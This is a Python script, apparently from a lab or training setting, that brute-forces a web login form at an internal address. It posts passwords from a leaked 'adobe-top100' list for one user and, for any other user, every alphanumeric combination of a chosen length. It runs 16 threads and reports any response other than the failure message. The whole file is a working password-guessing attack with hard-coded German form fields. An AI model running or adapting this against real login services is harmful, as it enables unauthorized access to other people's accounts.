
import itertools
import requests
from multiprocessing.dummy import Pool as ThreadPool

pool = ThreadPool(16)
user_input = input('Nutzername: ')
user_array = ['bob', 'ute', 'paul']
combination_array = []
session = requests.Session()
combined = []


def create_ingredients():
    password_ingredients = ''

    for x in range(10):
        password_ingredients += str(x)

    for i in range(ord('a'), ord('z')+1):
        password_ingredients += chr(i)

    for j in range(ord('A'), ord('Z')+1):
        password_ingredients += chr(j)

    return password_ingredients


def create_password(ingredients, length):
    combinations = []
    combinations += itertools.product(ingredients, repeat=length)
    print('Anzahl der Kombinationen: ' + str(len(combinations)))
    return combinations


def combine_profil(user_list, combination_list):
    for i in range(len(user_list)):
        for j in range(len(combination_list)):
            combined.append('Profil ' + user_list[i] +' ' + str(j) + ' : ' + ''.join(combination_list[j]))
            print(''.join(combination_list[j]))

    with open('combination_list.txt', 'w') as filehandle:
        for listitem in combined:
            filehandle.write('%s\n' % listitem)


url = 'http://172.50.1.5:8080/validate?'


def execute_hack(x):

    combinations = combination_array

    if user_input == 'joe':
        #print('Versuchsnummer: ' + str(x) + ' key: ' + passwords[x])
        data = {
            'benutzername': user_input,
            'passwort': passwords[x]
        }
        r = session.post(url, data=data, stream=True)
        if r.text != 'Benutzername oder Passwort falsch!':
            print('Versuchsnummer: ' + str(x))
            print(user_input + ' ' + passwords[x])
            print(r.text)

    else:

        #print('Versuchsnummer: ' + str(x))
        data = {
            'benutzername': user_input,
            'passwort': ''.join(combinations[x])
        }
        r = session.post(url, data=data, stream=True)
        if r.text != 'Benutzername oder Passwort falsch!':
            print('Versuchsnummer: ' + str(x))
            print(user_input + ' ' + ''.join(combinations[x]))
            print(r.text)


if user_input != 'joe':
    password_length = int(input('Wie lang soll das Passwort sein? '))
    print('Ingredients: ' + create_ingredients())
    combination_array = create_password(create_ingredients(), password_length)
    #preparefortext = []
    #for i in range(len(combination_array)):
     #   preparefortext.append(''.join(combination_array[i]))

    #with open('combinations.txt', 'w') as filehandle:
     #   for listitem in preparefortext:
      #      filehandle.write(listitem + ',')
    #combine_profil(user_array, combination_array)


#execute_hack(combination_array)
passwords = []
f = open('adobe-top100.txt', 'r')
for line in f:
    line = line.strip()
    columns = line.split()
    passwords.append(columns[3])

f.close()

results = pool.imap(execute_hack, range(3844))

pool.close()
pool.join()

